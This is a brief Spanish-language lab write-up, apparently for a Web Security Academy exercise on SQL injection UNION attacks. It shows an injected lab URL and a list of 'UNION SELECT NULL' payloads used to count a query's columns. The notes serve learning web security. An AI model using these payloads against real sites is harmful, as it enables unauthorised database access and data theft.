# SQL injection UNION attack, determining the number of columns returned by the query

Solo teniamos que saber cuantas columnas tenia:

`https://0a0c00e703cdfd78807799e00031008d.web-security-academy.net/filter?category=Tech+gifts%27%20UNION%20SELECT%20NULL,%20NULL,%20NULL--`

```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.
```